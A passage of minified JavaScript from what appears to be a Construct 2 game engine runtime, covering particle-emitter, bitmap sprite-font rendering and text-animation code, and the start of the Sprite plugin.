t,e,i,s,n,r=this.runtime.getDt(this);if(0===this.spraytype&&this.spraying)for(this.particleCreateCounter+=r*this.rate,s=cr.floor(this.particleCreateCounter),this.particleCreateCounter-=s,t=0;t<s;t++)(i=this.allocateParticle()).init();for(this.particleBoxLeft=this.x,this.particleBoxTop=this.y,this.particleBoxRight=this.x,this.particleBoxBottom=this.y,n=t=0,e=this.particles.length;t<e;t++)i=this.particles[t],this.particles[n]=i,this.runtime.redraw=!0,1===this.spraytype&&this.first_tick&&i.init(),i.tick(r),i.active?(i.left()<this.particleBoxLeft&&(this.particleBoxLeft=i.left()),i.right()>this.particleBoxRight&&(this.particleBoxRight=i.right()),i.top()<this.particleBoxTop&&(this.particleBoxTop=i.top()),i.bottom()>this.particleBoxBottom&&(this.particleBoxBottom=i.bottom()),n++):o.push(i);cr.truncateArray(this.particles,n),this.set_bbox_changed(),this.first_tick=!1,1===this.spraytype&&0===this.particles.length&&this.runtime.DestroyInstance(this)},i.draw=function(t){for(var e,i=this.layer,s=0,n=this.particles.length;s<n;s++)(e=this.particles[s]).right()>=i.viewLeft&&e.bottom()>=i.viewTop&&e.left()<=i.viewRight&&e.top()<=i.viewBottom&&e.draw(t)},i.drawGL=function(t){this.particlescale=this.layer.getScale(),t.setTexture(this.type.webGL_texture);for(var e,i=this.layer,s=0,n=this.particles.length;s<n;s++)(e=this.particles[s]).right()>=i.viewLeft&&e.bottom()>=i.viewTop&&e.left()<=i.viewRight&&e.top()<=i.viewBottom&&e.drawGL(t)},s.prototype.IsSpraying=function(){return this.spraying},t.cnds=new s,n.prototype.SetSpraying=function(t){this.spraying=0!==t},n.prototype.SetEffect=function(t){this.blend_mode=t,this.compositeOp=cr.effectToCompositeOp(t),cr.setGLBlend(this,t,this.runtime.gl),this.runtime.redraw=!0},n.prototype.SetRate=function(t){var e,i;if(this.rate=t,1===this.spraytype&&this.first_tick)if(t<this.particles.length)for(e=this.particles.length-t,i=0;i<e;i++)o.push(this.particles.pop());else if(t>this.particles.length)for(e=t-this.particles.length,i=0;i<e;i++)this.allocateParticle().opacity=0},n.prototype.SetSprayCone=function(t){this.spraycone=cr.to_radians(t)},n.prototype.SetInitSpeed=function(t){this.initspeed=t},n.prototype.SetInitSize=function(t){this.initsize=t},n.prototype.SetInitOpacity=function(t){this.initopacity=t/100},n.prototype.SetGrowRate=function(t){this.growrate=t},n.prototype.SetXRandomiser=function(t){this.xrandom=t},n.prototype.SetYRandomiser=function(t){this.yrandom=t},n.prototype.SetSpeedRandomiser=function(t){this.speedrandom=t},n.prototype.SetSizeRandomiser=function(t){this.sizerandom=t},n.prototype.SetGrowRateRandomiser=function(t){this.growrandom=t},n.prototype.SetParticleAcc=function(t){this.acc=t},n.prototype.SetGravity=function(t){this.g=t},n.prototype.SetAngleRandomiser=function(t){this.lifeanglerandom=t},n.prototype.SetLifeSpeedRandomiser=function(t){this.lifespeedrandom=t},n.prototype.SetOpacityRandomiser=function(t){this.lifeopacityrandom=t},n.prototype.SetTimeout=function(t){this.timeout=t},t.acts=new n,r.prototype.ParticleCount=function(t){t.set_int(this.particles.length)},r.prototype.Rate=function(t){t.set_float(this.rate)},r.prototype.SprayCone=function(t){t.set_float(cr.to_degrees(this.spraycone))},r.prototype.InitSpeed=function(t){t.set_float(this.initspeed)},r.prototype.InitSize=function(t){t.set_float(this.initsize)},r.prototype.InitOpacity=function(t){t.set_float(100*this.initopacity)},r.prototype.InitGrowRate=function(t){t.set_float(this.growrate)},r.prototype.XRandom=function(t){t.set_float(this.xrandom)},r.prototype.YRandom=function(t){t.set_float(this.yrandom)},r.prototype.InitSpeedRandom=function(t){t.set_float(this.speedrandom)},r.prototype.InitSizeRandom=function(t){t.set_float(this.sizerandom)},r.prototype.InitGrowRandom=function(t){t.set_float(this.growrandom)},r.prototype.ParticleAcceleration=function(t){t.set_float(this.acc)},r.prototype.Gravity=function(t){t.set_float(this.g)},r.prototype.ParticleAngleRandom=function(t){t.set_float(this.lifeanglerandom)},r.prototype.ParticleSpeedRandom=function(t){t.set_float(this.lifespeedrandom)},r.prototype.ParticleOpacityRandom=function(t){t.set_float(this.lifeopacityrandom)},r.prototype.Timeout=function(t){t.set_float(this.timeout)},t.exps=new r}();var jText="",window;cr.plugins_.SkymenSFPlusPLus=function(t){this.runtime=t},function(){var t=cr.plugins_.SkymenSFPlusPLus.prototype;t.onCreate=function(){},t.Type=function(t){this.plugin=t,this.runtime=t.runtime};var e=t.Type.prototype;function f(t){return t.replace(/\s\s*$/,"")}e.onCreate=function(){this.is_family||(this.texture_img=new Image,this.texture_img.crossOrigin="anonymous",this.texture_img.idtkLoadDisposed=!0,this.texture_img.src=this.texture_file,this.runtime.wait_for_textures.push(this.texture_img),this.webGL_texture=null)},e.onLostWebGLContext=function(){this.is_family||(this.webGL_texture=null)},e.onRestoreWebGLContext=function(){var t,e;if(!this.is_family&&this.instances.length)for(this.webGL_texture||(this.webGL_texture=this.runtime.glwrap.loadTexture(this.texture_img,!1,this.runtime.linearSampling,this.texture_pixelformat)),t=0,e=this.instances.length;t<e;t++)this.instances[t].webGL_texture=this.webGL_texture},e.unloadTextures=function(){this.is_family||this.instances.length||!this.webGL_texture||(this.runtime.glwrap.deleteTexture(this.webGL_texture),this.webGL_texture=null)},e.preloadCanvas2D=function(e){try{e.drawImage(this.texture_img,0,0)}catch(t){this.texture_img.onload=function(){e.drawImage(this.texture_img,0,0)}}},t.Instance=function(t){this.type=t,this.runtime=t.runtime},(e=t.Instance.prototype).onDestroy=function(){var t;h(this.lines),t=this.clipList,s(b,t,!1),t=this.clipUV,s(w,t,!1),cr.wipe(this.characterWidthList)},e.onCreate=function(){this.texture_img=this.type.texture_img,this.characterWidth=this.properties[0],this.characterHeight=this.properties[1],this.characterSet=this.properties[2],this.text=this.properties[3],this.characterScale=this.properties[4],this.visible=0===this.properties[5],this.clamp=0===this.properties[14],this.halign=this.clamp?cr.clamp(this.properties[6],0,100)/100:this.properties[6]/100,this.valign=this.clamp?cr.clamp(this.properties[7],0,100)/100:this.properties[7]/100,this.wrapbyword=0===this.properties[9],this.nowrap=2===this.properties[9],this.characterSpacing=this.properties[10],this.lineHeight=this.properties[11],this.textWidth=0,this.textHeight=0,this.charWidthJSON=this.properties[12],this.spaceWidth=this.properties[13],this.charPos={data:[0]},this.charPosProcessed=[[[0]]],this.lastValue=0,jText=this.charWidthJSON,this.recycled?(this.lines.length=0,cr.wipe(this.clipList),cr.wipe(this.clipUV),cr.wipe(this.characterWidthList)):(this.lines=[],this.clipList={},this.clipUV={},this.characterWidthList={});try{if(this.charWidthJSON)if(-1!==this.charWidthJSON.indexOf('""c2array""'))for(var t=(r=jQuery.parseJSON(this.charWidthJSON.replace(/""/g,'"'))).size[1],e=0;e<t;e++)for(var i=r.data[1][e][0],s=r.data[0][e][0],n=0;n<i.length;n++)this.characterWidthList[i.charAt(n)]=s;else for(var r,t=(r=jQuery.parseJSON(this.charWidthJSON)).length,e=0;e<t;e++)for(i=r[e][1],s=r[e][0],n=0;n<i.length;n++)this.characterWidthList[i.charAt(n)]=s;-1!==this.spaceWidth&&(this.characterWidthList[" "]=this.spaceWidth)}catch(t){window.console&&window.console.log&&window.console.log("SpriteFont+ Failure: "+t)}this.text_changed=!0,this.lastwrapwidth=this.width,this.runtime.glwrap&&(this.type.webGL_texture||(this.type.webGL_texture=this.runtime.glwrap.loadTexture(this.type.texture_img,!1,this.runtime.linearSampling,this.type.texture_pixelformat)),this.webGL_texture=this.type.webGL_texture),this.SplitSheet()},e.saveToJSON=function(){var t,e={t:this.text,csc:this.characterScale,csp:this.characterSpacing,lh:this.lineHeight,tw:this.textWidth,th:this.textHeight,lrt:this.last_render_tick,ha:this.halign,va:this.valign,clamp:this.clamp,wbw:this.wrapbyword,nw:this.nowrap,charpos:this.charPos,charpospro:this.charPosProcessed,lastvalue:this.lastValue,cw:{}};for(t in this.characterWidthList)e.cw[t]=this.characterWidthList[t];return e},e.loadFromJSON=function(t){for(var e in this.text=t.t,this.characterScale=t.csc,this.characterSpacing=t.csp,this.lineHeight=t.lh,this.textWidth=t.tw,this.textHeight=t.th,this.halign=t.ha,this.valign=t.va,this.clamp=t.clamp,this.nowrap=t.nw,this.wrapbyword=t.wbw,this.charPos=t.charpos,this.charPosProcessed=t.charpospro,this.lastValue=t.lastvalue,t.cw)this.characterWidthList[e]=t.cw[e];this.text_changed=!0,this.lastwrapwidth=this.width};var i=1e3;function v(t,e){return t.length?t.pop():new e}function m(t,e){t.length<i&&t.push(e)}function s(t,e,i){if(i){for(var s=0,n=e.length;s<n;s++)m(t,e[s]);e.length=0}else for(var r in e)Object.prototype.hasOwnProperty.call(e,r)&&(m(t,e[r]),delete e[r])}function y(t,e,i){var s=t.lines;i=f(i),e>=s.length&&s.push(a()),(e=s[e]).text=i,e.width=t.measureWidth(i),t.textWidth=cr.max(t.textWidth,e.width)}var _=[];function a(){return v(_,Object)}function h(t){s(_,t,!0)}var b=[],w=[];e.SplitSheet=function(){for(var t,e,i,s,n,r,o=this.texture_img,a=o.width,o=o.height,h=this.characterWidth,c=this.characterHeight,l=h/a,u=c/o,p=this.characterSet,d=Math.floor(a/h),g=Math.floor(o/c),f=0;f<p.length&&!(d*g<=f);f++){var m=f%d,y=Math.floor(f/d),_=p.charAt(f);this.runtime.glwrap?(t=this.clipUV,i=m*l,s=y*u,n=(1+m)*l,r=(y+1)*u,void 0===t[e=_]&&(t[e]=v(w,cr.rect)),t[e].left=i,t[e].top=s,t[e].right=n,t[e].bottom=r):(t=this.clipList,e=m*h,r=y*c,m=h,y=c,void 0===t[_=_]&&(t[_]=v(b,Object)),t[_].x=e,t[_].y=r,t[_].w=m,t[_].h=y)}};var x=[];t.TokeniseWords=function(t){for(var e,i="",s=x.length=0;s<t.length;)if("\n"===(e=t.charAt(s)))i.length&&(x.push(i),i=""),x.push("\n"),++s;else if(" "===e||"\t"===e||"-"===e){for(;i+=t.charAt(s),s++,s<t.length&&(" "===t.charAt(s)||"\t"===t.charAt(s)););x.push(i),i=""}else s<t.length&&(i+=e,s++);i.length&&x.push(i)},t.WordWrap=function(t){var e=t.text,i=t.lines;if(e&&e.length){var s=t.width;if(s<=2)h(i);else{var n=t.characterWidth,r=t.characterScale,o=t.characterSpacing;if(e.length*(n*r+o)-o<=s&&-1===e.indexOf("\n")){o=t.measureWidth(e);if(o<=s)return h(i),i.push(a()),i[0].text=e,i[0].width=o,t.textWidth=o,void(t.textHeight=t.characterHeight*r+t.lineHeight)}t.wrapbyword;this.WrapText(t),t.textHeight=i.length*(t.characterHeight*r+t.lineHeight)}}else h(i)},t.WrapText=function(t){for(var e,i,s=t.wrapbyword,n=t.nowrap,r=t.text,o=t.lines,a=t.width,h=s?(this.TokeniseWords(r),x):n?[r]:r,c="",l=0,u=!1,p=0;p<h.length;p++)if("\n"!==h[p]){if(u=!1,e=c,c+=h[p],a<t.measureWidth(f(c))){if(""===e)if(s){for(;t.measureWidth(f(c))>a;){for(var d=c,g="";t.measureWidth(f(d))>=a;)g=d[d.length-1]+g,d=d.slice(0,-1);y(t,l,d),c=g,l++}l--}else y(t,l,c),u=!(c="");else for(y(t,l,e),c=h[p],e="";t.measureWidth(f(c))>a;){l++;for(d=c,g="";t.measureWidth(f(d))>=a;)g=d[d.length-1]+g,d=d.slice(0,-1);y(t,l,d),c=g}l++}}else!0===u?u=!1:(y(t,l,c),l++),c="";for(f(c).length&&(y(t,l,c),l++),p=l;p<o.length;p++)i=o[p],m(_,i);o.length=l},e.measureWidth=function(t){for(var e=this.characterSpacing,i=t.length,s=0,n=0;n<i;n++)s+=this.getCharacterWidth(t.charAt(n))*this.characterScale+e;return s-=0<s?e:0},e.getCharacterWidth=function(t){var e=this.characterWidthList;return void 0!==e[t]?e[t]:this.characterWidth},e.rebuildText=function(){!this.text_changed&&this.width===this.lastwrapwidth||(this.textWidth=0,this.textHeight=0,this.type.plugin.WordWrap(this),this.text_changed=!1,this.lastwrapwidth=this.width)},e.draw=function(t,e){var i=this.texture_img;if(""!==this.text&&null!=i&&(this.rebuildText(),!(this.height<this.characterHeight*this.characterScale+this.lineHeight))){t.globalAlpha=this.opacity;var s=this.x,i=this.y;this.runtime.pixel_rounding&&(s=s+.5|0,i=i+.5|0),t.save(),t.translate(s,i),t.rotate(this.angle);var n=this.angle,r=this.halign,s=this.valign,o=this.characterScale,a=this.characterHeight*o,h=this.lineHeight,c=this.characterSpacing,l=this.lines,i=this.textHeight,u=this.charPosProcessed,p=!1;u&&void 0!==u[0][2]&&(p=!0),0!==n&&(Math.cos(n),Math.sin(n));for(var d,s=s*cr.max(0,this.height-i),g=-(this.hotspotX*this.width),i=-(this.hotspotY*this.height),f=i+=s,n=this.angle,m=0,y=0,_=0,v=1,b=0;b<l.length;b++){var w=l[b].text,x=l[b].width,S=g+r*cr.max(0,this.width-x);f+=h;for(var T=0;T<w.length;T++){var C,O,k,A,E,I,P,M=w.charAt(T),F=this.clipList[M];if(S+this.getCharacterWidth(M)*o>this.width+1e-5)break;void 0!==F&&(p&&(void 0===u[m]?(_=y=0,d=n):(y=u[m][0]*Math.cos(n)-u[m][1]*Math.sin(n)||0,_=u[m][1]*Math.cos(n)-u[m][0]*Math.sin(n)||0,d=cr.to_radians(u[m][2])||0,v=u[m][3]/100||1)),P=I=0,t.globalAlpha=this.opacity*v,C=V(this,this.texture_img,void 0===u[m]?"None":u[m][4],F,o,M),p&&0!==d?(O=S+this.getCharacterWidth(M)*o/2,k=f+a,A=Math.atan2(k,O)+Math.PI-d,E=Math.sqrt(Math.pow(-O,2)+Math.pow(-k,2)),I=-O-Math.cos(A)*E,P=-k-Math.sin(A)*E,t.save(),t.rotate(d),t.translate(Math.round(S+y+I),Math.round(f+_+P)),C===this.texture_img?t.drawImage(this.texture_img,F.x,F.y,F.w,F.h,0,0,F.w*o,F.h*o):t.drawImage(C,0,0),t.restore()):C===this.texture_img?t.drawImage(this.texture_img,F.x,F.y,F.w,F.h,Math.round(S+y+I),Math.round(f+_+P),F.w*o,F.h*o):t.drawImage(C,Math.round(S+y+I),Math.round(f+_+P))),S+=this.getCharacterWidth(M)*o+c,p&&m++,0}if((f+=a)+a+h>this.height)break}t.restore()}};var N=new cr.quad;function V(t,e,i,s,n,r){if(!i||"None"===i)return e;if(void 0!==t.cachedImages&&void 0!==t.cachedImages[r]&&void 0!==t.cachedImages[r][i])return t.cachedImages[r][i];var o,a,a=(o=s.w*n,a=s.h*n,(h=document.createElement("canvas")).width=o,h.height=a,h),h=a.getContext("2d");return h.fillStyle="black",h.fillRect(0,0,a.width,a.height),h.drawImage(e,s.x,s.y,s.w,s.h,0,0,s.w*n,s.h*n),h.globalCompositeOperation="multiply",h.fillStyle=i,h.fillRect(0,0,s.w*n,s.h*n),h.globalCompositeOperation="destination-in",h.drawImage(e,s.x,s.y,s.w,s.h,0,0,s.w*n,s.h*n),h.globalCompositeOperation="source-over",void 0===t.cachedImages&&(t.cachedImages={}),void 0===t.cachedImages[r]&&(t.cachedImages[r]={}),t.cachedImages[r][i]=a}function G(t,e,i){var s=t.tlx*e-t.tly*i;t.tly=t.tly*e+t.tlx*i,t.tlx=s,s=t.trx*e-t.try_*i,t.try_=t.try_*e+t.trx*i,t.trx=s,s=t.blx*e-t.bly*i,t.bly=t.bly*e+t.blx*i,t.blx=s,s=t.brx*e-t.bry*i,t.bry=t.bry*e+t.brx*i,t.brx=s}function n(){}function r(){}function o(){}e.drawGL=function(t){if(""!==this.text&&(this.rebuildText(),!(this.height<this.characterHeight*this.characterScale+this.lineHeight))){this.update_bbox();var e=this.bquad,i=0,s=0;this.runtime.pixel_rounding&&(i=(this.x+.5|0)-this.x,s=(this.y+.5|0)-this.y);var n,r,o=this.angle,a=this.halign,h=this.valign,c=this.characterScale,l=this.characterHeight*c,u=this.lineHeight,p=this.characterSpacing,d=this.lines,g=this.textHeight,f=this.charPosProcessed,m=!1;f&&void 0!==f[0][2]&&(m=!0),0!==o&&(n=Math.cos(o),r=Math.sin(o));for(var y,g=h*cr.max(0,this.height-g),_=e.tlx+i,v=e.tly+s,b=g,w=0,x=0,S=0,T=0,C=0,O=1,k=0;k<d.length;k++){var A=d[k].text,E=d[k].width,I=a*cr.max(0,this.width-E);b+=u;for(var P=0;P<A.length;P++){var M,F,L,D,R,j=A.charAt(P),B=this.clipUV[j];if(void 0!==B&&(R={x:B.left*this.texture_img.width,y:B.top*this.texture_img.height,w:B.right*this.texture_img.width-B.left*this.texture_img.width,h:B.bottom*this.texture_img.height-B.top*this.texture_img.height},"None"!==(D=void 0===f[w]?"None":f[w][4])&&void 0!==this.cachedTextures&&void 0!==this.cachedTextures[j]&&void 0!==this.cachedTextures[j][D]?(t.setTexture(this.cachedTextures[j][D]),B={top:0,left:0,right:1,bottom:1}):"None"!==D&&(M=V(this,this.texture_img,D,R,1,j))!=this.texture_img?(F=this.runtime.glwrap.loadTexture(M,!1,this.runtime.linearSampling,this.type.texture_pixelformat),void 0===this.cachedTextures&&(this.cachedTextures={}),void 0===this.cachedTextures[j]&&(this.cachedTextures[j]={}),this.cachedTextures[j][D]=F,t.setTexture(F),B={top:0,left:0,right:1,bottom:1}):t.setTexture(this.webGL_texture)),I+this.getCharacterWidth(j)*c>this.width+1e-5)break;m&&(void 0===f[w]?(S=x=0,y=o):(x=f[w][0]*Math.cos(o)-f[w][1]*Math.sin(o)||0,S=f[w][1]*Math.cos(o)-f[w][0]*Math.sin(o)||0,y=cr.to_radians(f[w][2])||0,O=void 0!==f[w][3]&&null!==f[w][3]?f[w][3]/100:1),0!==y&&(T=Math.cos(y),C=Math.sin(y))),void 0!==B&&(L=this.characterWidth*c,R=this.characterHeight*c,N.tlx=I,N.tly=b,N.trx=I+L,N.try_=b,N.blx=I,N.bly=b+R,N.brx=I+L,N.bry=b+R,m&&0!==y&&(D=I+this.getCharacterWidth(j)*c/2,F=b+l,L=Math.atan2(F,D)+Math.PI-y,R=Math.sqrt(Math.pow(-D,2)+Math.pow(-F,2)),D=-D-Math.cos(L)*R,R=-F-Math.sin(L)*R,N.offset(D,R),G(N,T,C)),0!==o&&G(N,n,r),N.offset(_,v),m&&N.offset(x,S),t.setOpacity(this.opacity*O),t.quadTex(N.tlx,N.tly,N.trx,N.try_,N.brx,N.bry,N.blx,N.bly,B)),I+=this.getCharacterWidth(j)*c+p,m&&w++,0}if((b+=l)+l+u>this.height)break}}},e.update=function(){this.runtime.redraw=!0,this.lastValue+=Math.abs(60*this.runtime.getDt(this)),this.charPosProcessed=this.computeWholeArray(this.charPos.data)},e.computeWholeArray=function(t){var e=[];if(void 0!==this.typewriterParams&&this.typewriterActive&&!this.firstFrame)for(var i=0;i<t.length;i++){var s=t[i],n=this.typeProgress[i][0],r=null===this.typewriterParams.value.x?this.compute(s[0],i):cr.lerp(this.typewriterParams.value.x,this.compute(s[0],i),n),o=null===this.typewriterParams.value.y?this.compute(s[1],i):cr.lerp(this.typewriterParams.value.y,this.compute(s[1],i),n),a=null===this.typewriterParams.value.a?this.compute(s[2],i):cr.lerp(this.typewriterParams.value.a,this.compute(s[2],i),n),n=null===this.typewriterParams.value.o?this.compute(s[3],i,!0):cr.lerp(this.typewriterParams.value.o,this.compute(s[3],i,!0),n);e.push([r,o,a,n,s[4]])}else for(i=0;i<t.length;i++){s=t[i];e.push([this.compute(s[0],i),this.compute(s[1],i),this.compute(s[2],i),this.compute(s[3],i,!0),s[4]])}return e},e.compute=function(t,e,i){if(i=void 0!==i&&i,this.hasBehavior()||void 0!==this.animOffset||(this.animOffset=1,this.defaultMagnitude=0,this.defaultSpeed=100),"number"==typeof t)return t;if("object"==typeof t&&1==t.length)return this.compute(t[0],e);if("string"!=typeof t)return 0;var t=t.split(" "),s=t[0].trim().toLowerCase(),n=0,r=this.defaultSpeed,o=0,n=void 0===t[1]||""==t[1].trim()||isNaN(parseInt(t[1].trim()))?i?100:(0===this.defaultMagnitude?this.characterHeight:this.defaultMagnitude)/(s.startsWith("angle")?1:4):parseInt(t[1].trim()),r=void 0===t[2]||""==t[2].trim()||isNaN(parseInt(t[2].trim()))?this.defaultSpeed:this.defaultSpeed*parseInt(t[2].trim())/100,o=void 0===t[3]||""==t[3].trim()||isNaN(parseInt(t[3].trim()))?0:parseInt(t[3].trim());switch(s){case"wave":return Math.sin(10*cr.to_radians(this.lastValue*r/100)+e*this.animOffset)*n+o;case"swing":return Math.cos(10*cr.to_radians(this.lastValue*r/100)+e*this.animOffset*(i?-1:1))*n+o;case"angle":return Math.sin(10*cr.to_radians(this.lastValue*r/100)+e*this.animOffset)*n+o;case"angle2":return Math.cos(10*cr.to_radians(this.lastValue*r/100)+e*this.animOffset)*n+o;case"shake":return(Math.random()-.5)*n+o;default:var a=parseInt(s);return isNaN(a)?i?100:0:a}},e.hasBehavior=function(){if(void 0!==this.sfdxbehavior)return this.sfdxbehavior;this.sfdxbehavior=!1;var e=this;return this.behavior_insts.forEach(function(t){cr.behaviors.SkymenSFPPP&&t.behavior instanceof cr.behaviors.SkymenSFPPP&&(e.sfdxbehavior=!0)}),this.sfdxbehavior},n.prototype.CompareText=function(t,e){return e?this.text==t:cr.equals_nocase(this.text,t)},t.cnds=new n,r.prototype.SetText=function(t){cr.is_number(t)&&t<1e9&&(t=Math.round(1e10*t)/1e10);t=t.toString();this.text!==t&&(this.text=t,this.text_changed=!0,this.runtime.redraw=!0)},r.prototype.AppendText=function(t){cr.is_number(t)&&(t=Math.round(1e10*t)/1e10);t=t.toString();t&&(this.text+=t,this.text_changed=!0,this.runtime.redraw=!0)},r.prototype.SetScale=function(t){t!==this.characterScale&&(this.characterScale=t,this.text_changed=!0,this.runtime.redraw=!0)},r.prototype.SetCharacterSpacing=function(t){t!==this.CharacterSpacing&&(this.characterSpacing=t,this.text_changed=!0,this.runtime.redraw=!0)},r.prototype.SetLineHeight=function(t){t!==this.lineHeight&&(this.lineHeight=t,this.text_changed=!0,this.runtime.redraw=!0)},e.SetCharWidth=function(t,e){e=parseInt(e,10);this.characterWidthList[t]!==e&&(this.characterWidthList[t]=e,this.text_changed=!0,this.runtime.redraw=!0)},r.prototype.SetCharacterWidth=function(t,e){if(""!==t)for(var i=0;i<t.length;i++)this.SetCharWidth(t.charAt(i),e)},r.prototype.SetEffect=function(t){this.compositeOp=cr.effectToCompositeOp(t),cr.setGLBlend(this,t,this.runtime.gl),this.runtime.redraw=!0},r.prototype.SetVerAl=function(t){this.clamp?this.valign=cr.clamp(t,0,100)/100:this.valign=t/100,this.text_changed=!0,this.runtime.redraw=!0},r.prototype.SetHorAl=function(t){this.clamp?this.halign=cr.clamp(t,0,100)/100:this.halign=t/100,this.text_changed=!0,this.runtime.redraw=!0},r.prototype.SetAl=function(t,e){this.clamp?(this.halign=cr.clamp(t,0,100)/100,this.valign=cr.clamp(e,0,100)/100):(this.halign=t/100,this.valign=e/100),this.text_changed=!0,this.runtime.redraw=!0},r.prototype.SetWrap=function(t){this.wrapbyword=0===t,this.nowrap=2===t,this.text_changed=!0,this.runtime.redraw=!0},r.prototype.SetClamp=function(t){this.clamp=0===t,this.clamp?(this.halign=cr.clamp(this.halign,0,1),this.valign=cr.clamp(this.valign,0,1)):(this.halign=this.halign,this.valign=this.valign),this.text_changed=!0,this.runtime.redraw=!0},r.prototype.SetCharPos=function(t){this.charPos!==JSON.parse(t)&&(this.charPos=JSON.parse(t),this.text_changed=!0,this.runtime.redraw=!0)},r.prototype.Redraw=function(){this.update()},r.prototype.LoadURL=function(t,e,i,s){var n=new Image,r=this;this.characterWidth=0<i?i:this.characterWidth,this.characterHeight=0<s?s:this.characterHeight,n.onload=function(){r.texture_img=n,r.runtime.glwrap?(r.has_own_texture&&r.webGL_texture&&r.runtime.glwrap.deleteTexture(r.webGL_texture),r.webGL_texture=r.runtime.glwrap.loadTexture(n,!0,r.runtime.linearSampling)):r.pattern=r.runtime.ctx.createPattern(n,"repeat"),r.has_own_texture=!0,r.runtime.redraw=!0,r.runtime.trigger(cr.plugins_.SkymenSFPlusPLus.prototype.cnds.OnURLLoaded,r)},"data:"!==t.substr(0,5)&&0===e&&(n.crossOrigin="anonymous"),this.runtime.setImageSrc(n,t)},t.acts=new r,o.prototype.CharacterWidth=function(t,e){t.set_int(this.getCharacterWidth(e))},o.prototype.CharacterHeight=function(t){t.set_int(this.characterHeight)},o.prototype.CharacterScale=function(t){t.set_float(this.characterScale)},o.prototype.CharacterSpacing=function(t){t.set_int(this.characterSpacing)},o.prototype.LineHeight=function(t){t.set_int(this.lineHeight)},o.prototype.Text=function(t){t.set_string(this.text)},o.prototype.TextWidth=function(t){this.rebuildText(),t.set_float(this.textWidth)},o.prototype.TextHeight=function(t){this.rebuildText(),t.set_float(this.textHeight)},o.prototype.FullTextWidth=function(t){t.set_float(this.measureWidth(this.text))},o.prototype.HAlign=function(t){t.set_float(this.halign)},o.prototype.VAlign=function(t){t.set_float(this.valign)},o.prototype.CharPos=function(t){t.set_string(this.charPos)},t.exps=new o}(),cr.plugins_.Sprite=function(t){this.runtime=t},function(){var t=cr.plugins_.Sprite.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime};var e=t.Type.prototype;function c(){var t,e;return 0===this.datauri.length&&((t=document.createElement("canvas")).width=this.width,t.height=this.height,e=t.getContext("2d"),this.spritesheeted?e.drawImage(this.texture_img,this.offx,this.offy,this.width,this.height,0,0,this.width,this.height):e.drawImage(this.texture_img,0,0,this.width,this.height),this.datauri=t.toDataURL("image/png")),this.datauri}e.onCreate=function(){var t,e,i,s,n,r,o,a,h;if(!this.is_family)for(this.all_frames=[],this.has_loaded_textures=!1,t=0,e=this.animations.length;t<e;t++){for(n=this.animations[t],(o={}).name=n[0],o.speed=n[1],o.loop=n[2],o.repeatcount=n[3],o.repeatto=n[4],o.pingpong=n[5],o.sid=n[6],o.frames=[],i=0,s=n[7].length;i<s;i++)r=n[7][i],(a={}).texture_file=r[0],a.texture_filesize=r[1],a.offx=r[2],a.offy=r[3],a.width=r[4],a.height=r[5],a.duration=r[6],a.hotspotX=r[7],a.hotspotY=r[8],a.image_points=r[9],a.poly_pts=r[10],a.pixelformat=r[11],a.spritesheeted=0!==a.width,a.datauri="",a.getDataUri=c,h={left:0,top:0,right:1,bottom:1},a.sheetTex=h,a.webGL_texture=null,(h=this.runtime.findWaitingTexture(r[0]))?a.texture_img=h:(a.texture_img=new Image,a.texture_img.cr_src=r[0],a.texture_img.cr_filesize=r[1],a.texture_img.c2webGL_texture=null,this.runtime.waitForImageLoad(a.texture_img,r[0])),cr.seal(a),o.frames.push(a),this.all_frames.push(a);cr.seal(o),this.animations[t]=o}},e.updateAllCurrentTexture=function(){for(var t,e=0,i=this.instances.length;e<i;e++)(t=this.instances[e]).curWebGLTexture=t.curFrame.webGL_texture},e.onLostWebGLContext=function(){if(!this.is_family){for(var t,e=0,i=this.all_frames.length;e<i;++e)(t=this.all_frames[e]).texture_img.c2webGL_texture=null,t.webGL_texture=null;this.has_loaded_textures=!1,this.updateAllCurrentTexture()}},e.onRestoreWebGLContext=function(){if(!this.is_family&&this.instances.length){for(var t,e=0,i=this.all_frames.length;e<i;++e)(t=this.all_frames[e]).webGL_texture=this.runtime.glwrap.loadTexture(t.texture_img,!1,this.runtime.linearSampling,t.pixelformat);this.updateAllCurrentTexture()}},e.loadTextures=function(){if(!this.is_family&&!this.has_loaded_textures&&this.runtime.glwrap){for(var t,e=0,i=this.all_frames.length;e<i;++e)(t=this.all_frames[e]).webGL_texture=this.runtime.glwrap.loadTexture(t.texture_img,!1,this.runtime.linearSampling,t.pixelformat);this.has_loaded_textures=!0}},e.unloadTextures=function(){if(!this.is_family&&!this.instances.length&&this.has_loaded_textures){for(var t,e=0,i=this.all_frames.length;e<i;++e)t=this.all_frames[e],this.runtime.glwrap.deleteTexture(t.webGL_texture),t.webGL_texture=null;this.has_loaded_textures=!1}};var n=[];e.preloadCanvas2D=function(t){var e,i,s;for(cr.clearArray(n),e=0,i=this.all_frames.length;e<i;++e)s=this.all_frames[e].texture_img,-1===n.indexOf(s)&&(t.drawImage(s,0,0),n.push(s))},t.Instance=function(t){this.type=t,this.runtime=t.runtime;t=this.type.animations[0].frames[0].poly_pts;this.recycled?this.collision_poly.set_pts(t):this.collision_poly=new cr.CollisionPoly(t)};var i=t.Instance.prototype;function s(){}i.onCreate=function(){this.visible=0===this.properties[0],this.isTicking=!1,this.inAnimTrigger=!1,this.collisionsEnabled=0!==this.properties[3],this.cur_animation=this.getAnimationByName(this.properties[1])||this.type.animations[0],this.cur_frame=this.properties[2],this.cur_frame<0&&(this.cur_frame=0),this.cur_frame>=this.cur_animation.frames.length&&(this.cur_frame=this.cur_animation.frames.length-1);var t,e,i,s,n,r,o,a,h=this.cur_animation.frames[this.cur_frame];for(this.collision_poly.set_pts(h.poly_pts),this.hotspotX=h.hotspotX,this.hotspotY=h.hotspotY,this.cur_anim_speed=this.cur_animation.speed,this.cur_anim_repeatto=this.cur_animation.repeatto,1===this.type.animations.length&&1===this.type.animations[0].frames.length||0===this.cur_anim_speed||(this.runtime.tickMe(this),this.isTicking=!0),this.recycled?this.animTimer.reset():this.animTimer=new 